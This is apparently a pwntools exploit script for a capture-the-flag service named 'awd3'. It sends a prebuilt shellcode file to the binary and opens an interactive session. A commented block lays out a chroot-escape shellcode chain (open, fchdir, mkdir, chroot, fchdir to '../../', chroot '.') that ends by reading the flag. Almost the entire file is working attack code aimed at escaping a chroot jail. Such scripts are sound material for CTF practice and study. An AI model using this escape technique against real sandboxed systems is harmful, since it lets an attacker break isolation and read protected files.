#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

io = process('./awd3')
'''
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep -E "mkdir|chroot|fchdir"
#define __NR_fchdir 81
#define __NR_mkdir 83
#define __NR_chroot 161
'''
chroot = 161
chdir = 81
mkdir = 83
# open / -> fchdir / -> mkdir subdir -> chroot /subdir/ -> fchdir ../../ -> chroot . -> cat flag

def runbin(lenth, data, arg):
    io.sendlineafter('len?\n', str(lenth))
    io.sendlineafter('data?\n', data)
    io.sendlineafter('elf?\n', arg)

if __name__ == '__main__':
    context.binary = './awd3'
    '''
    payload = shellcraft.open('/')
    payload += shellcraft.fchdir(3)
    payload += shellcraft.mkdir('subdir')
    payload += shellcraft.chroot('subdir')
    payload += shellcraft.open('../../')
    payload += shellcraft.fchdir(4)
    payload += shellcraft.chroot('.')
    # now root dir is equal to /
    payload += shellcraft.cat('flag')
    '''
    f = open('./exploit', 'rb')

    payload = f.read()
    runbin(len(payload)+1, payload, '')

    io.interactive()
    io.close()

